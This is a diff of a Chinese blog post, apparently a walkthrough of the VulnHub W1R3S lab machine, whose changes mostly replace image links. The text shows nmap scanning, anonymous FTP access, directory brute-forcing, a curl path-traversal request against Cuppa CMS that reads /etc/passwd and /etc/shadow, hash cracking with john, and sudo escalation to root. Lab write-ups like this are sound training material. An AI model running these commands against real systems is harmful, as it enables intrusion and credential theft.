@@ -18,78 +18,74 @@
 <p>开启靶机后用nmap扫描发现靶机ip</p>
 <p><code>sudo nmap -sn 192.168.37.0/24</code> （不知道具体ip可以通过关闭靶机前后分别扫描）</p>
 <p>ip地址为  <code>192.168.37.137</code></p>
-<img src="http://42.193.172.120:8088/images/2023/03/06/image-20230306232808593.png" alt="image-20230306232808593" style="zoom: 67%;">
-
-
-
+<p><img src="/2023/03/10/W1R3S/image-20230418123529176.png" alt="image-20230418123529176"></p>
 <p>2.端口扫描</p>
 <p><code>sudo nmap --min-rate 10000 -p- 192.168.37.137</code>  设置–min-rate参数确保扫得全and准确</p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230306234024911.png" alt="image-20230306234024911"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230418123538301.png" alt="image-20230418123538301"></p>
 <p>识别端口相关信息</p>
 <p><code>sudo nmap -sT -sV -O -p21,22,80,3306 192.168.37.137</code> -sT用TCP协议 -sV获得对应服务的版本信息 -O获得主机信息</p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230306234448903.png" alt="image-20230306234448903"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230418123547253.png" alt="image-20230418123547253"></p>
 <p><code>sudo nmap -sU -p21,22,80,3306 192.168.37.137</code> -sU用udp协议 (往往开发人员忽略了UDP协议)</p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230306235136429.png" alt="image-20230306235136429"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230418123629804.png" alt="image-20230418123629804"></p>
 <p>4个端口侧重点：80&gt;21&gt;3306&gt;22</p>
 <p>其中ssh服务 一般是通过暴力破解password  所以为最不可能一项</p>
 <p><code>sudo nmap --script=vuln -p21,22,80,3306 192.168.37.137</code></p>
 <p>利用nmap自带的漏洞扫描对端口进行扫描</p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307000604489.png" alt="image-20230307000604489"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230418123645392.png" alt="image-20230418123645392"></p>
 <p>从结果得知21 22端口没有信息  80端口中web服务框架为wordpress 是重点突破的地方</p>
 <p>MAC地址显示VMware 如果是在真实环境中获得的，宿主环境很可能是window系统</p>
 <h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><h4 id="测试ftp是否允许匿名登陆"><a href="#测试ftp是否允许匿名登陆" class="headerlink" title="测试ftp是否允许匿名登陆"></a>测试ftp是否允许匿名登陆</h4><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv10444306?from=search">FTP（匿名登录）未授权访问漏洞</a></p>
 <p>FTP的匿名登录一般有三种：<br>1、 用户名：anonymous 密码：Email或者为空<br>2、 用户名：FTP 密码：FTP或者为空<br>3、 用户名：USER 密码：pass</p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307003058115.png" alt="image-20230307003058115"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230418123751298.png" alt="image-20230418123751298"></p>
 <p>成功匿名登陆</p>
 <p><strong>注！！！  ftp登陆后 需要输入binary切换一下</strong> </p>
 <p>原因ftp 默认为ascii获取文件内容，当获取的文件为可执行文件时，不输入binary则可能会损坏可执行文件</p>
 <p><strong>ftp文件下载命令 wget +文件名</strong></p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307003500326.png"></p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307004356477.png" alt="image-20230307004356477"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230418123806603.png" alt="image-20230418123806603"></p>
 <p>其中 employee-names.txt涉及一些敏感信息泄露 可能对于后续有用</p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307004844476.png" alt="image-20230307004844476"></p>
-<h3 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h3><h4 id="访问页面"><a href="#访问页面" class="headerlink" title="访问页面"></a>访问页面</h4><p><img src="http://42.193.172.120:8088/images/2023/03/06/image-20230307103605194.png" alt="image-20230307103605194"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230307004844476.png" alt="image-20230307004844476"></p>
+<h3 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h3><h4 id="访问页面"><a href="#访问页面" class="headerlink" title="访问页面"></a>访问页面</h4><p><img src="/2023/03/10/W1R3S/image-20230307103605194.png" alt="image-20230307103605194"></p>
 <p>前面得知它是一个wordpress框架，通过目录爆破获得对应框架的路径</p>
 <h4 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h4><p>利用feroxbuster及kali自带字典进行爆破  路径：<code>/usr/share/seclists/</code></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jiajiajiang_/article/details/88638367">kali系统自带字典wordlists简介</a></p>
 <p><code>feroxbuster -u http://192.168.37.137 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</code></p>
 <p>扫描结果</p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/07/image-20230308004531661.png" alt="image-20230308004531661"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230308004531661.png" alt="image-20230308004531661"></p>
 <p>其中wordpress 与 administrator目录</p>
 <h4 id="Cuppa-CMS"><a href="#Cuppa-CMS" class="headerlink" title="Cuppa CMS"></a>Cuppa CMS</h4><p>先访问<a target="_blank" rel="noopener" href="http://192.168.37.137/administrator">http://192.168.37.137/administrator</a> 获得一个CMS安装界面</p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/07/image-20230308004759753.png" alt="image-20230308004759753"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230308004759753.png" alt="image-20230308004759753"></p>
 <p>点击next后出现注册信息</p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/07/image-20230308004837893.png" alt="image-20230308004837893"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230308004837893.png" alt="image-20230308004837893"></p>
 <p>随意填写再次点击next后安装失败   提示没有Administrator权限 此路不通</p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/07/image-20230308004937654.png" alt="image-20230308004937654"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230308004937654.png" alt="image-20230308004937654"></p>
 <p>用searchsploit搜索cuppa cms相关漏洞</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63844103/article/details/128405733">【网安神器篇】——searchsploit漏洞利用搜索工具</a> </p>
 <p>查询到相关漏洞描述文件 并用-m参数将一个漏洞利用镜像（副本）到当前工作目录(后面跟漏洞ID号) </p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308110519802.png" alt="image-20230308110519802"></p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308231808038.png" alt="image-20230308231808038"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230308110519802.png" alt="image-20230308110519802"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230308231808038.png" alt="image-20230308231808038"></p>
 <p>get传参访问 没有结果  </p>
-<img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308231847812.png" alt="image-20230308231847812" style="zoom:50%;">
+<img src="/2023/03/10/W1R3S/image-20230308231847812.png" alt="image-20230308231847812" style="zoom:50%;">
 
 <p>由于$_REQUEST可以用post传参  所以用curl尝试post传参</p>
 <p><code>curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.37.137/administrator/alerts/alertConfigField.php</code></p>
 <p>成功获得&#x2F;etc&#x2F;passwd内容   <a target="_blank" rel="noopener" href="http://c.biancheng.net/view/839.html">Linux &#x2F;etc&#x2F;passwd内容解释</a></p>
-<img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308232053571.png" alt="image-20230308232053571" style="zoom:67%;">
+<img src="/2023/03/10/W1R3S/image-20230308232053571.png" alt="image-20230308232053571" style="zoom:67%;">
 
 <p>尝试查看&#x2F;etc&#x2F;shadow文件   <a target="_blank" rel="noopener" href="http://c.biancheng.net/view/839.html">Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细）</a></p>
 <p><code>curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.37.137/administrator/alerts/alertConfigField.php</code></p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308233232927.png" alt="image-20230308233232927"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230308233232927.png" alt="image-20230308233232927"></p>
 <p>将&#x2F;etc&#x2F;shadow中三个较长的信息收集在一个txt文件内 用john破解</p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/08/image-20230308234943255.png"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230308234943255.png"></p>
 <p>获得其中两个用户的账号密码，很明显可以看出w1r3s权限更高些</p>
 <p>利用账号密码ssh远程登陆</p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309143845639.png" alt="image-20230309143845639"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230309143845639.png" alt="image-20230309143845639"></p>
 <p>成功getshell</p>
 <p>查询权限   <code>sudo -l</code> 显示了允许当前用户使用的命令</p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309144316710.png" alt="image-20230309144316710"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230309144316710.png" alt="image-20230309144316710"></p>
 <p>利用sudo提权 <code>sudo /bin/bash</code></p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309144822739.png" alt="image-20230309144822739"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230309144822739.png" alt="image-20230309144822739"></p>
 <p>获得flag.txt  结束本次靶机的练习</p>
-<p><img src="http://42.193.172.120:8088/images/2023/03/09/image-20230309145240649.png" alt="image-20230309145240649"></p>
+<p><img src="/2023/03/10/W1R3S/image-20230309145240649.png" alt="image-20230309145240649"></p>
 </div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ljxxxxx</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://ljx-go.top/2023/03/10/W1R3S/">http://ljx-go.top/2023/03/10/W1R3S/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://ljx-go.top">ljxxxxx'blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulnhub%E9%9D%B6%E6%9C%BA/">vulnhub靶机</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2023/03/11/JARBAS/"><i class="fa fa-chevron-left">  </i><span>JARBAS</span></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://w.wallhaven.cc/full/zy/wallhaven-zyxvqy.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By ljxxxxx</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
